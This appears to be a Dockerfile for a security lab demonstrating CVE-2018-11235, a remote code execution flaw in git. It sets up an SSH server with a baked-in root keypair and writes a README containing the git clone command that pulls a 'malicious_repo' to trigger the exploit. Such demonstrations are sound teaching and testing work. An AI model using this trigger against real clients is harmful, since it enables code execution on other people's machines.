FROM ygouzerh/security:oldgit

RUN apt-get install -y openssh-server && \
        ssh-keygen -A && \
        apt-get install -y python3-dev && \
        apt-get install -y python3-pip && \
        pip3 install requests && \
        mkdir -p /run/sshd

RUN mkdir /root/.ssh
ADD key/id_rsa /root/.ssh/id_rsa
ADD key/id_rsa.pub /root/.ssh/id_rsa.pub
RUN chmod 600 /root/.ssh/id_rsa
RUN chmod 644 /root/.ssh/id_rsa.pub

EXPOSE 22

RUN printf "=== Remote Code Execution using git (CVE-2018-11235) ===\n=== Execute this command ===\ngit clone --recurse-submodules root@server:home/poc/malicious_repo client_pwned" > README.txt

ENTRYPOINT /usr/sbin/sshd && cat README.txt && bash
